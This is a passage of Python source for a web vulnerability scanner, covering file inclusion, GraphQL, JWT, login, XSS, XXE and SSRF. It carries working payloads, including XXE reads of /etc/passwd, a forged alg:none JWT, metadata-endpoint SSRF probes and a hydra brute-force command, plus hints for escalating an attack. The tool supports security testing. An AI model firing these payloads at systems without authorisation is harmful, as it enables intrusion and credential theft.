                                    "Determine if the include is remote too (RFI) by testing an "
                                    "http:// URL you control.",
                                ],
                                request=request_label(url),
                            )
                        )
                        hit = True
                        break
                if hit:
                    break

            # --- 3. PHP wrappers -------------------------------------------
            if not hit:
                for wrapper in self.WRAPPERS:
                    resp, url = self._get(param, wrapper)
                    if resp.error or not resp.text:
                        continue
                    source = self._decode_php(resp.text)
                    if source:
                        self.console.crit(f"lfi: php://filter source disclosure on {param!r}")
                        findings.append(
                            Finding(
                                module=self.name,
                                title="PHP filter wrapper source disclosure",
                                severity="HIGH",
                                endpoint=url,
                                parameter=param,
                                payload=wrapper,
                                evidence=source[:300].replace("\n", " "),
                                detail=(
                                    "php://filter/convert.base64-encode reads the target file and "
                                    "base64-encodes it, so the response is source code rather than "
                                    "executed output. This works even when ../ traversal is filtered."
                                ),
                                remediation=(
                                    "Never derive an include path from request data. Allow-list the "
                                    "permitted pages and check the resolved path with realpath()."
                                ),
                                next_steps=[
                                    "Read index.php, config.php and any db.php to recover credentials.",
                                    "Look for another include to chain, or an upload to reach code execution.",
                                ],
                                request=request_label(url),
                            )
                        )
                        hit = True
                        break

            # --- RFI / blind confirmation -----------------------------------
            # Same rule as XXE and SSRF: the built-in listener is polled and a
            # hit is proof; an external --oob listener is a manual lead.
            if not hit:
                oob, can_confirm = oob_base(self.t)
                if oob:
                    marker = "rfi" + rand_token(8)
                    rfi_url = f"{oob}/{marker}.txt"
                    _, url = self._get(param, rfi_url)
                    self.console.info(f"lfi: RFI probe dispatched -> {rfi_url}")
                    if can_confirm:
                        hits = poll_callback(self.t, marker, timeout=6.0)
                        if hits:
                            self.console.crit("lfi: callback received -- RFI confirmed")
                            findings.append(
                                Finding(
                                    module=self.name,
                                    title="Remote File Inclusion confirmed via out-of-band callback",
                                    severity="HIGH",
                                    endpoint=url,
                                    parameter=param,
                                    payload=rfi_url,
                                    evidence=f"target fetched {hits[0]['path']} from {hits[0]['client']}",
                                    detail="The include path was taken from request data and the target "
                                           "made an outbound request for it. With allow_url_include=On "
                                           "this is direct code execution: include a file you host.",
                                    remediation="Set allow_url_include=Off, set allow_url_fopen=Off where "
                                                "possible, and map page names to a fixed allow-list instead "
                                                "of accepting paths.",
                                    references=[
                                        "https://owasp.org/www-community/attacks/Remote_File_Inclusion"
                                    ],
                                    next_steps=[
                                        "Host a harmless PHP marker file and confirm it executes.",
                                        "Check whether the same parameter is LFI without wrappers.",
                                    ],
                                    request=request_label(url),
                                )
                            )
                        else:
                            self.console.info("lfi: no RFI callback received within 6s")
                    else:
                        findings.append(
                            Finding(
                                module=self.name,
                                title="RFI probe dispatched (manual confirmation required)",
                                severity="INFO",
                                endpoint=url,
                                parameter=param,
                                payload=rfi_url,
                                evidence=f"requested {rfi_url}; check the external listener for a hit",
                                detail="If the target fetches this URL, allow_url_include is on and "
                                       "the parameter is remotely includable. Confirmation must be "
                                       "observed on the listener, not inferred from the response.",
                                remediation="Set allow_url_include=Off and never include "
                                            "request-derived paths.",
                                next_steps=[f"Watch the external listener at {oob} for the request."],
                                request=request_label(url),
                            )
                        )
        return findings


# ---------------------------------------------------------------------------
# 8.6 GRAPHQL
# ---------------------------------------------------------------------------
class GraphQLModule(Module):
    """
    Endpoint discovery + introspection.

    Introspection is not a vulnerability by itself, but a fully introspectable
    production endpoint hands an attacker the entire schema, including mutations
    nobody meant to expose. The module reports the schema and flags mutations
    that look destructive or administrative.
    """

    name = "graphql"
    description = "Endpoint discovery and __schema introspection dumping"

    # Empty string first: the target URL may already BE the endpoint.
    CANDIDATES = ["", "/graphql", "/api/graphql", "/graphql/api", "/v1/graphql", "/query", "/api"]

    INTROSPECTION = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            args { name type { name kind ofType { name kind } } }
            type { name kind ofType { name kind ofType { name kind } } }
          }
          inputFields { name }
          enumValues(includeDeprecated: true) { name }
          possibleTypes { name }
        }
      }
    }
    """

    def _post(self, url: str, query: str) -> Resp:
        return self.t.http.post(
            url,
            json={"query": query},
            headers={"Content-Type": "application/json", "Accept": "application/json"},
        )

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        base = self.t.url.rstrip("/")

        for path in self.CANDIDATES:
            url = base + path
            probe = self._post(url, "{__typename}")
            if probe.error or not probe.text:
                continue
            if "__typename" not in probe.text and "errors" not in probe.text.lower():
                continue
            self.console.good(f"graphql endpoint responds at {url}")

            # Introspection
            schema_resp = self._post(url, self.INTROSPECTION)
            schema = None
            try:
                data = json.loads(schema_resp.text)
            except (json.JSONDecodeError, ValueError):
                data = None
            if isinstance(data, dict):
                schema = (data.get("data") or {}).get("__schema")

            if not schema:
                findings.append(
                    Finding(
                        module=self.name,
                        title="GraphQL endpoint discovered (introspection disabled)",
                        severity="LOW",
                        endpoint=url,
                        payload="{__typename}",
                        evidence=probe.snippet("__typename") or schema_resp.text[:200],
                        detail="The endpoint speaks GraphQL but refused the introspection query. "
                               "Schema can still be reconstructed through field suggestions and "
                               "error messages, so treat the API as discoverable.",
                        remediation="Disable introspection in production, disable field suggestions, "
                                    "and enforce per-field authorisation.",
                        references=["https://graphql.org/learn/introspection/"],
                        request=f"POST {url} {{__typename}}",
                    )
                )
                continue

            outfile = self.t.loot / "graphql_schema.json"
            outfile.parent.mkdir(parents=True, exist_ok=True)
            outfile.write_text(json.dumps(schema, indent=2), encoding="utf-8")

            types = schema.get("types", [])
            object_types = [t for t in types if t.get("kind") == "OBJECT" and not str(t.get("name", "")).startswith("__")]
            mutations: List[str] = []
            mutation_type = (schema.get("mutationType") or {}).get("name")
            for t in types:
                if mutation_type and t.get("name") == mutation_type:
                    mutations = [f.get("name", "") for f in (t.get("fields") or [])]

            dangerous = [m for m in mutations if re.search(r"delete|remove|drop|admin|reset|update|create|grant", m, re.I)]
            self.console.good(f"introspection succeeded: {len(object_types)} object types, "
                              f"{len(mutations)} mutations -> {outfile}")

            findings.append(
                Finding(
                    module=self.name,
                    title="GraphQL introspection enabled (full schema disclosed)",
                    severity="MEDIUM",
                    endpoint=url,
                    payload="{__schema { types { name fields { name } } }}",
                    evidence=f"{len(object_types)} object types; mutation type: {mutation_type or 'none'}; "
                             f"mutations: {', '.join(mutations[:15]) or 'none'}",
                    detail=(
                        "The schema enumerates every query, mutation and field, including ones with no "
                        "UI. That shortens reconnaissance to minutes and typically reveals "
                        "administrative mutations and ID-based lookups that are prime IDOR targets. "
                        f"Schema saved to {outfile}."
                    ),
                    remediation=(
                        "Disable introspection in production (graphql.NoSchemaIntrospection or the "
                        "equivalent), remove unused mutations, and authorise every field "
                        "server-side rather than relying on obscurity."
                    ),
                    references=["https://owasp.org/www-project-web-security-testing-guide/"],
                    next_steps=[
                        "Review the saved schema for mutations with no UI and for fields returning "
                        "other users' objects (IDOR).",
                        "Test whether queries are depth-limited; a deeply nested query can DoS the API.",
                    ],
                    request=f"POST {url} introspection",
                )
            )

            if dangerous:
                findings.append(
                    Finding(
                        module=self.name,
                        title="Sensitive GraphQL mutations exposed",
                        severity="HIGH",
                        endpoint=url,
                        payload=", ".join(dangerous[:10]),
                        evidence=", ".join(dangerous[:20]),
                        detail="These mutation names suggest state-changing or administrative "
                               "operations. Confirm whether they enforce authorisation, or whether "
                               "the schema merely documents them.",
                        remediation="Enforce authorisation per mutation at the resolver layer and remove "
                                    "mutations that are not needed in production.",
                        next_steps=[
                            "Attempt a read-only mutation (e.g. update your own record) and inspect the "
                            "response for another user's data.",
                        ],
                        request=f"POST {url}",
                    )
                )
            break  # first responsive endpoint is enough
        return findings


# ---------------------------------------------------------------------------
# 8.7 JWT
# ---------------------------------------------------------------------------
class JWTModule(Module):
    """
    JWT hygiene and the classic algorithm-confusion check.

    * Analyse the token: alg, exp, claims, whether it is signed at all.
    * Test whether the verifier accepts `alg: none` with a stripped signature.
      If a forged token is treated as authenticated, that is the finding -- we
      report it and stop; we do not brute-force the HMAC secret.
    """

    name = "jwt"
    description = "JWT decoding, weak-claim checks, alg:none acceptance test"

    @staticmethod
    def b64d(part: str) -> Dict[str, Any]:
        part = part + "=" * (-len(part) % 4)
        return json.loads(base64.urlsafe_b64decode(part.encode()).decode("utf-8", "replace"))

    @staticmethod
    def b64e(obj: Dict[str, Any]) -> str:
        raw = json.dumps(obj, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(raw).decode().rstrip("=")

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        token = self.t.args.token
        if not token and self.t.baseline:
            # Opportunistic: look for a JWT in Set-Cookie or the body.
            blob = json.dumps(dict(self.t.baseline.headers)) + self.t.baseline.text[:4000]
            match = re.search(r"eyJ[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]*", blob)
            token = match.group(0) if match else None
        if not token:
            self.console.info("jwt: no token supplied or observed; skipping")
            return findings

        try:
            header_b64, payload_b64, signature = (token.split(".") + ["", ""])[:3]
            header = self.b64d(header_b64)
            payload = self.b64d(payload_b64)
        except (ValueError, json.JSONDecodeError, binascii.Error):
            self.console.warn("jwt: token could not be decoded")
            return findings

        self.console.info(f"jwt: alg={header.get('alg')} claims={list(payload)}")

        # --- hygiene -------------------------------------------------------
        problems = []
        if header.get("alg") == "none":
            problems.append("token is unsigned (alg=none)")
        if "exp" not in payload:
            problems.append("no exp claim (token never expires)")
        if payload.get("role") in ("admin", "administrator") or "is_admin" in payload:
            problems.append("privilege stored in a client-held claim")
        if problems:
            findings.append(
                Finding(
                    module=self.name,
                    title="Weak JWT configuration",
                    severity="MEDIUM",
                    endpoint=self.t.url,
                    payload=token[:40] + "...",
                    evidence="; ".join(problems),
                    detail="Claims are only as trustworthy as the signature that protects them. "
                           "Missing expiry and client-held privilege flags turn any key leak into "
                           "permanent admin access.",
                    remediation="Sign with a strong secret or asymmetric key, enforce exp/nbf, keep "
                                "authorisation state server-side, and reject alg values not in an "
                                "explicit allow-list.",
                    references=["https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"],
                    request=f"Authorization: Bearer {token[:30]}...",
                )
            )

        # --- alg:none acceptance -------------------------------------------
        if self.t.args.jwt_check:
            # Sanity gate first: if the endpoint returns the same body with no
            # token at all, it is not enforcing authentication here and a forged
            # token would "succeed" for reasons that have nothing to do with JWT.
            # Without this check every public page looks like an alg=none bypass.
            anon = self.t.http.get(self.t.url)
            original = self.t.http.get(self.t.url, headers={"Authorization": f"Bearer {token}"})
            accepted_original = original.ok
            if anon.ok and original.ok and anon.digest == original.digest:
                self.console.info(
                    "jwt: --jwt-check skipped; this endpoint answers identically without a "
                    "token, so it does not enforce JWT auth (test a protected endpoint instead)"
                )
                return findings
            for alg in ("none", "None", "NONE"):
                forged = f"{self.b64e({'alg': alg, 'typ': 'JWT'})}.{payload_b64}."
                resp = self.t.http.get(self.t.url, headers={"Authorization": f"Bearer {forged}"})
                if resp.ok and accepted_original and resp.digest == original.digest:
                    self.console.crit("jwt: verifier accepted an unsigned token (alg=none)")
                    findings.append(
                        Finding(
                            module=self.name,
                            title="JWT algorithm confusion: alg=none accepted",
                            severity="CRITICAL",
                            endpoint=self.t.url,
                            payload=forged[:60] + "...",
                            evidence=f"original token -> {original.status} ({original.length}B); "
                                     f"unsigned token -> {resp.status} ({resp.length}B), identical body",
                            detail="The verifier trusts the alg header, so an attacker can strip the "
                                   "signature and rewrite any claim (sub, role, tenant) while still "
                                   "being treated as authenticated.",
                            remediation="Pin the expected algorithm server-side (verify with a fixed "
                                        "alg and key), reject 'none' explicitly, and never read the "
                                        "algorithm from the token header.",
                            next_steps=[
                                "Forge a token with an escalated claim (e.g. role=admin) and confirm "
                                "the privilege change is honoured.",
                            ],
                            request=f"GET {self.t.url} with alg=none token",
                        )
                    )
                    break
                self.console.debug(f"jwt: alg={alg} rejected ({resp.status})")
        else:
            self.console.info("jwt: pass --jwt-check to test alg:none acceptance")

        return findings


# ---------------------------------------------------------------------------
# 8.8 LOGIN FORM DISCOVERY
# ---------------------------------------------------------------------------
class LoginModule(Module):
    """
    Finds authentication forms and characterises them: fields, method, action,
    CSRF tokens, and whether the response differs for a bogus user.

    Deliberately not automated: credential guessing. hydra/medusa are reported as
    the tool to use, with a ready-to-run command, but the operator supplies the
    username, the wordlist and the judgement about lockout thresholds. That is
    the part where a script makes trouble for a lab (and for an engagement).
    """

    name = "login"
    description = "Login form discovery, CSRF/lockout characterisation, hydra hand-off"

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        if not _HAS_BS4:
            self.console.warn("beautifulsoup4 not installed; form parsing skipped")
            return findings

        pages = [self.t.url] + [urljoin(self.t.url, p) for p in ("/login", "/signin", "/admin")]
        seen_actions: set = set()

        for page in pages:
            resp = self.t.http.get(page) if page != self.t.url else (self.t.baseline or self.t.http.get(page))
            if not resp or resp.error or not resp.text:
                continue
            soup = BeautifulSoup(resp.text, "html.parser")
            for form in soup.find_all("form"):
                inputs = form.find_all(["input", "textarea"])
                names = [i.get("name") for i in inputs if i.get("name")]
                if not any((i.get("type") or "").lower() == "password" for i in inputs):
                    continue
                action = form.get("action") or page
                action_url = urljoin(page, action)
                if action_url in seen_actions:
                    continue
                seen_actions.add(action_url)
                method = (form.get("method") or "get").upper()
                csrf = [n for n in names if re.search(r"csrf|token|nonce", n, re.I)]
                user_field = next((n for n in names if re.search(r"user|email|login|name", n, re.I)), names[0] if names else "username")
                pass_field = next((n for n in names if re.search(r"pass", n, re.I)), "password")

                self.console.good(f"login form: {method} {action_url} fields={names}")

                # Characterise: does a wrong user produce a distinct response?
                try:
                    probe_data = {user_field: f"vapf_{rand_token(5)}", pass_field: rand_token(9)}
                    for extra in names:
                        if extra not in probe_data:
                            probe_data[extra] = "1"
                    if method == "POST":
                        bogus = self.t.http.post(action_url, data=probe_data)
                    else:
                        bogus = self.t.http.get(action_url, params=probe_data)
                    behaviour = f"bogus login -> {bogus.status} ({bogus.length}B)"
                except Exception as exc:  # pragma: no cover - defensive
                    behaviour = f"probe failed: {exc}"

                hydra_cmd = (
                    f"hydra -l <USER> -P <WORDLIST> {urlparse(action_url).hostname} "
                    f"http-post-form \"{urlparse(action_url).path}:"
                    + ":".join(f"{k}=^USER^" if k == user_field else (f"{k}=^PASS^" if k == pass_field else f"{k}=1") for k in names if k not in csrf)
                    + ":F=<failure string>\""
                )

                findings.append(
                    Finding(
                        module=self.name,
                        title="Authentication form discovered",
                        severity="INFO",
                        endpoint=action_url,
                        parameter=f"{user_field}/{pass_field}",
                        payload="",
                        evidence=f"method={method}; fields={', '.join(names)}; "
                                 f"csrf={', '.join(csrf) or 'none'}; {behaviour}",
                        detail=(
                            "Login surface mapped. If the form is used for brute force, the "
                            "operator must first confirm the lockout threshold and the failure "
                            "string, and must stay inside the engagement's rate limits."
                        ),
                        remediation=(
                            "Enforce account lockout or exponential backoff, require MFA on "
                            "privileged accounts, return a generic failure message, and rate-limit "
                            "per source IP."
                        ),
                        next_steps=[
                            f"Manual credential test: {hydra_cmd}",
                            "Check for username enumeration by comparing responses for valid vs "
                            "invalid users.",
                            "Verify whether the CSRF token is actually validated by replaying a "
                            "form submission without it." if csrf else
                            "No CSRF token on the login form; test whether cross-site login CSRF is possible.",
                        ],
                        request=f"{method} {action_url}",
                    )
                )
        return findings


# ---------------------------------------------------------------------------
# 8.9 XSS
# ---------------------------------------------------------------------------
class XSSModule(Module):
    """
    Reflected XSS detection.

    Three steps, each of which can stop the module early:

      1. A unique canary proves the input reaches the response at all.
      2. A harmless unknown tag (<vpx...>) proves whether markup is reflected
         raw or entity-encoded. Raw markup is the precondition for XSS; encoded
         markup means escaping is working and there is nothing to report.
      3. Only then are break-out payloads sent, and a payload only counts if it
         survives *unmodified* in the response.

    It also does static DOM analysis on the target page: no JavaScript is
    executed, the inline scripts are read and a source (location.search,
    document.cookie) feeding a sink (innerHTML, document.write, eval) in the
    same block is flagged. That is a lead, not a finding, and is graded so.
    """

    name = "xss"
    description = "Reflected XSS breakout probes, encoding check, static DOM source/sink analysis"

    # Every payload embeds the per-request marker, so a hit is unambiguous and
    # the report can quote the exact bytes that came back.
    BREAKOUTS: List[Tuple[str, str]] = [
        ("double-quoted attribute", '\"><svg onload=confirm(\'{m}\')>'),
        ("single-quoted attribute", "'><svg onload=confirm('{m}')>"),
        ("unquoted attribute", " onmouseover=confirm('{m}') x="),
        ("HTML body", "<svg onload=confirm('{m}')>"),
        ("script block", "</script><script>confirm('{m}')</script>"),
        ("javascript: URI", "javascript:confirm('{m}')"),
    ]

    # Static analysis patterns for inline scripts (the DOM XSS half of the check).
    SOURCE_RE = re.compile(
        r"location\.(?:search|hash|href)|document\.(?:URL|documentURI|referrer|cookie)|window\.name",
        re.I,
    )
    SINK_RE = re.compile(
        r"innerHTML|outerHTML|document\.write(?:ln)?\s*\(|eval\s*\(|new\s+Function|"
        r"setAttribute\s*\(|insertAdjacentHTML|\.src\s*=|location\s*=",
        re.I,
    )

    def _send(self, param: str, value: str) -> Tuple[Resp, str]:
        return self.t.inject(param, value)

    @staticmethod
    def context_of(body: str, idx: int) -> str:
        """Classify the reflection point from the markup that precedes it."""
        before = body[max(0, idx - 200):idx]
        if before.rfind("<script") > before.rfind("</script"):
            return "inside <script>"
        if before.rfind("<!--") > before.rfind("-->"):
            return "inside an HTML comment"
        if before.rfind("<") > before.rfind(">"):
            if before.rfind('="') > before.rfind('"'):
                return "inside a double-quoted attribute"
            if before.rfind("='") > before.rfind("'"):
                return "inside a single-quoted attribute"
            return "inside an HTML tag"
        return "in the HTML body"

    def run(self) -> List[Finding]:
        findings: List[Finding] = []

        for param in self.t.params:
            marker = "vpx" + rand_token(8)
            canary, _ = self._send(param, marker)
            if canary.error or marker not in canary.text:
                self.console.debug(f"xss: {param!r} not reflected")
                continue

            idx = canary.text.find(marker)
            context = self.context_of(canary.text, idx)
            self.console.info(f"xss: {param!r} reflected {context} -- checking encoding")

            # Step 2: does raw markup survive?
            tag = f"<vpx{marker}>"
            tag_resp, tag_url = self._send(param, tag)
            if tag not in tag_resp.text:
                encoded = f"&lt;vpx{marker}&gt;" in tag_resp.text
                self.console.info(
                    f"xss: {param!r} encodes angle brackets"
                    + (" (as entities)" if encoded else "") + " -- no markup injection"
                )
                continue

            # Step 3: find a payload that survives whole.
            confirmed: Optional[Tuple[str, str, Resp, str]] = None
            for label, template in self.BREAKOUTS:
                payload = template.format(m=marker)
                resp, url = self._send(param, payload)
                if resp.ok and payload in resp.text:
                    confirmed = (label, payload, resp, url)
                    break

            if confirmed:
                label, payload, resp, url = confirmed
                self.console.crit(f"xss: reflected XSS via {param!r} ({label} break-out)")
                findings.append(
                    Finding(
                        module=self.name,
                        title="Reflected Cross-Site Scripting (XSS)",
                        severity="HIGH",
                        endpoint=url,
                        parameter=param,
                        payload=payload,
                        evidence=resp.snippet(marker),
                        detail=(
                            f"The payload survived unmodified and landed {context}, so the browser "
                            "will parse it as markup/script. That gives an attacker script execution "
                            "in the origin: DOM access, actions as the victim, and theft of anything "
                            "the page can read that is not HttpOnly."
                        ),
                        remediation=(
                            "Context-aware output encoding at render time (HTML-escape in HTML, "
                            "attribute-escape in attributes, JSON-encode in <script>), plus a CSP that "
                            "forbids inline script. Encode on output, not on input."
                        ),
                        references=[
                            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                            "https://portswigger.net/web-security/cross-site-scripting",
                        ],
                        next_steps=[
                            "Confirm in a browser with a benign proof of concept (alert(document.domain)); "
                            "do not exfiltrate real session data into a report.",
                            "Check whether the cookie is HttpOnly: that decides whether session theft is "
                            "possible or 'only' in-page action hijacking.",
                            "Test whether the same input is stored and re-rendered elsewhere (stored XSS).",
                        ],
                        request=request_label(url),
                    )
                )
            else:
                # Markup works but no full break-out: report the weaker, accurate claim.
                self.console.warn(f"xss: {param!r} reflects raw markup but no full break-out")
                findings.append(
                    Finding(
                        module=self.name,
                        title="HTML injection (raw markup reflection)",
                        severity="MEDIUM",
                        endpoint=tag_url,
                        parameter=param,
                        payload=tag,
                        evidence=tag_resp.snippet(marker),
                        detail=(
                            f"An unknown tag was reflected unencoded {context}, so HTML is being "
                            "injected even though none of the script-bearing break-outs survived. "
                            "Depending on context this is often one filter away from XSS."
                        ),
                        remediation=(
                            "HTML-encode <, >, & and the quote character for the surrounding context; "
                            "add a Content-Security-Policy as defence in depth."
                        ),
                        next_steps=[
                            "Determine the exact filter (tag allow-list? event handler strip?) and test "
                            "whether a permitted tag such as <svg> or <details> still carries an event.",
                        ],
                        request=request_label(tag_url),
                    )
                )

        findings.extend(self._dom_analysis())
        return findings

    def _dom_analysis(self) -> List[Finding]:
        """Static source->sink scan of inline scripts. No JS is executed."""
        page = self.t.baseline
        if not page or not page.text:
            return []
        for script in re.findall(r"<script[^>]*>(.*?)</script>", page.text, re.I | re.S):
            if len(script) > 40000:
                continue
            src = self.SOURCE_RE.search(script)
            sink = self.SINK_RE.search(script)
            if not (src and sink):
                continue
            start = max(0, min(src.start(), sink.start()) - 60)
            snippet = " ".join(script[start:start + 260].split())
            self.console.warn("xss: inline script has a DOM source feeding a sink")
            return [
                Finding(
                    module=self.name,
                    title="Potential DOM-based XSS (static source -> sink)",
                    severity="LOW",
                    endpoint=self.t.url,
                    parameter="(client-side)",
                    payload=f"{src.group(0)} -> {sink.group(0)}",
                    evidence=snippet,
                    detail=(
                        "An inline script reads a user-controllable source and writes it into a "
                        "sink the browser parses as HTML/JS. This is static analysis only: the "
                        "data flow may still be blocked by code between the two, so it needs "
                        "browser confirmation before it is reported as a vulnerability."
                    ),
                    remediation=(
                        "Use textContent or createElement/appendChild instead of innerHTML; avoid "
                        "eval and document.write; validate the value against an allow-list before "
                        "it reaches any sink."
                    ),
                    references=["https://portswigger.net/web-security/cross-site-scripting/dom-based"],
                    next_steps=[
                        "Load the page with a canary in the source (e.g. ?q=vpx123) and watch whether "
                        "the DOM contains it unescaped.",
                    ],
                    request=f"GET {self.t.url} (static analysis of inline scripts)",
                )
            ]
        return []


# ---------------------------------------------------------------------------
# 8.10 XXE
# ---------------------------------------------------------------------------
class XXEModule(Module):
    """
    XML External Entity injection.

    The target URL is POSTed an XML document. Three escalating checks:

      1. Local file read: an external entity pointing at /etc/passwd. If its
         contents appear in the response, the parser resolved an external entity.
      2. php://filter: same idea, but base64-encoded, which still works when the
         response is a fragment or the file would break XML syntax.
      3. Blind OOB: the entity points at our callback listener. A hit proves the
         parser made the outbound request even when nothing is echoed back.

    Parameter entities + external DTDs are deliberately not attempted here:
    they need a hosted DTD and produce a second-order request pattern that is
    better driven by hand once step 1 or 3 has confirmed the parser is unsafe.
    """

    name = "xxe"
    description = "XML external entity: file disclosure, php://filter, blind OOB callback"

    FILE_READ = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
        '<r><v>&xxe;</v></r>'
    )
    PHP_FILTER = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>\n'
        '<r><v>&xxe;</v></r>'
    )

    def _post(self, body: str) -> Resp:
        return self.t.http.post(
            self.t.url,
            data=body,
            headers={"Content-Type": "application/xml", "Accept": "application/xml, text/xml, */*"},
        )

    def _decode(self, text: str) -> Optional[str]:
        for blob in re.findall(r"[A-Za-z0-9+/]{60,}={0,2}", text):
            try:
                decoded = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
            except (binascii.Error, ValueError):
                continue
            snippet = decoded.decode("utf-8", "ignore")
            if "<?php" in snippet:
                return snippet
        return None

    def run(self) -> List[Finding]:
        findings: List[Finding] = []

        # Does the endpoint even take XML? A 415 on a JSON API means this module
        # is testing the wrong surface, and we should say so instead of guessing.
        probe = self._post('<?xml version="1.0"?><r><v>1</v></r>')
        if probe.error:
            self.console.info("xxe: XML POST failed at transport level; skipping")
            return findings
        if probe.status in (404, 405, 415):
            self.console.info(
                f"xxe: {self.t.url} answered {probe.status} to application/xml; "
                "no XML entry point here (try the specific upload/API endpoint)"
            )
            return findings

        # --- 1. local file disclosure ----------------------------------
        resp = self._post(self.FILE_READ)
        if resp.ok and re.search(r"root:.*:0:0:", resp.text):
            self.console.crit("xxe: /etc/passwd disclosed through an external entity")
            findings.append(
                Finding(
                    module=self.name,
                    title="XXE: local file disclosure",
                    severity="CRITICAL",
                    endpoint=self.t.url,
                    payload='<!ENTITY xxe SYSTEM "file:///etc/passwd">',
                    evidence=resp.snippet("root:"),
                    detail=(
                        "The XML parser resolved an external entity and substituted the file's "
                        "contents into the document. Anything the process can read is readable: "
                        "application source, config with database credentials, SSH keys, "
                        "/proc/self/environ."
                    ),
                    remediation=(
                        "Disable DTD processing and external entity resolution in the parser "
                        "(libxml_disable_entity_loader(true) / FEATURE_SECURE_PROCESSING, or the "
                        "equivalent for your stack), and reject documents that declare a DOCTYPE."
                    ),
                    references=[
                        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
                    ],
                    next_steps=[
                        "Read the application's own source and config with a php://filter entity to "
                        "establish impact (credentials, paths, further bugs).",
                        "Check whether the entity loader also permits http:// (that turns XXE into SSRF).",
                    ],
                    request=f"POST {self.t.url} (Content-Type: application/xml)",
                )
            )
            return findings  # already the strongest possible result

        # --- 2. php://filter source disclosure --------------------------
        resp = self._post(self.PHP_FILTER)
        if resp.ok:
            source = self._decode(resp.text)
            if source:
                self.console.crit("xxe: PHP source disclosed via php://filter entity")
                findings.append(
                    Finding(
                        module=self.name,
                        title="XXE: PHP filter source disclosure",
                        severity="HIGH",
                        endpoint=self.t.url,
                        payload='<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">',
                        evidence=source[:300].replace("\n", " "),
                        detail=(
                            "The entity resolved to a base64-encoded copy of a PHP file, so source "
                            "code is readable even though the response would otherwise have broken "
                            "on the raw markup."
                        ),
                        remediation="Disable external entity resolution; reject DOCTYPE declarations.",
                        next_steps=[
                            "Walk the source for hard-coded credentials and further injection points.",
                            "Try /etc/passwd via the same entity to confirm full file read.",
                        ],
                        request=f"POST {self.t.url}",
                    )
                )
                return findings

        # --- 3. blind OOB -----------------------------------------------
        oob, can_confirm = oob_base(self.t)
        if oob:
            marker = "xxe" + rand_token(8)
            entity = f"{oob}/{marker}"
            body = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{entity}">]>\n'
                '<r><v>&xxe;</v></r>'
            )
            self.console.info(f"xxe: sending blind OOB entity -> {entity}")
            self._post(body)
            hits = poll_callback(self.t, marker, timeout=6.0) if can_confirm else []
            if hits:
                self.console.crit("xxe: callback received -- blind XXE confirmed")
                findings.append(
                    Finding(
                        module=self.name,
                        title="Blind XXE confirmed via out-of-band callback",
                        severity="HIGH",
                        endpoint=self.t.url,
                        payload=f'<!ENTITY xxe SYSTEM "{entity}">',
                        evidence=f"target connected back: {hits[0]['method']} {hits[0]['path']} "
                                 f"from {hits[0]['client']}",
                        detail=(
                            "The parser made an outbound request to a host we control, which proves "
                            "external entities are resolved even though nothing was reflected. That "
                            "same primitive usually reads local files and reaches internal services."
                        ),
                        remediation=(
                            "Disable DTD/external-entity processing, block outbound traffic from the "
                            "application host, and reject documents declaring a DOCTYPE."
                        ),
                        next_steps=[
                            "Convert this to a file read: point the entity at file:///etc/passwd and "
                            "exfiltrate through the same OOB channel (parameter entity + external DTD).",
                        ],
                        request=f"POST {self.t.url}",
                    )
                )
            elif can_confirm:
                self.console.info("xxe: no callback received within 6s")
            else:
                findings.append(
                    Finding(
                        module=self.name,
                        title="Blind XXE probe dispatched (manual confirmation required)",
                        severity="INFO",
                        endpoint=self.t.url,
                        payload=f'<!ENTITY xxe SYSTEM "{entity}">',
                        evidence=f"entity requested {entity}; check the external listener",
                        detail="If the listener saw this request, the parser resolves external "
                               "entities even though the result is not reflected.",
                        remediation="Disable DTD/external-entity processing and reject DOCTYPE.",
                        next_steps=[f"Watch the external listener at {oob}."],
                        request=f"POST {self.t.url}",
                    )
                )
        else:
            self.console.info("xxe: pass --callback-host or --oob to test blind XXE")

        return findings


# ---------------------------------------------------------------------------
# 8.11 SSRF
# ---------------------------------------------------------------------------
class SSRFModule(Module):
    """
    Server-Side Request Forgery.

    Only parameters that plausibly carry a URL are probed (name hints), unless
    the operator names one explicitly with --param. Each probe is compared with
    a baseline request to a guaranteed-unreachable host, so "the page always
    looks like that" does not turn into a finding.

    Confirmation comes from one of two things:
      * the response now contains content that only an internal fetch would
        produce (/etc/passwd, cloud metadata), and the payload itself was not
        simply reflected, or
      * our callback listener received a connection from the target.

    The encoded-IP forms (decimal, octal, shortened) are included because a
    blacklist for "127.0.0.1" is the most common (and most useless) defence.
    """

    name = "ssrf"
    description = "SSRF: loopback/internal probes, encoded IP forms, cloud metadata, OOB confirmation"

    NAME_HINTS = re.compile(
        r"(url|uri|link|href|src|dest|redirect|next|target|site|host|domain|fetch|proxy|"
        r"callback|image|img|avatar|feed|webhook|endpoint|path|api|page)",
        re.I,
    )

    PROBES: List[Tuple[str, str]] = [
        ("loopback", "http://127.0.0.1/"),
        ("loopback:80", "http://127.0.0.1:80/"),
        ("localhost", "http://localhost/"),
        ("IPv6 loopback", "http://[::1]/"),
        ("decimal IP 2130706433", "http://2130706433/"),
        ("octal IP 017700000001", "http://017700000001/"),
        ("shortened IP 127.1", "http://127.1/"),
        ("cloud metadata", "http://169.254.169.254/latest/meta-data/"),
    ]

    # Strings that only appear if the request actually reached something internal.
    INTERNAL_MARKERS = [
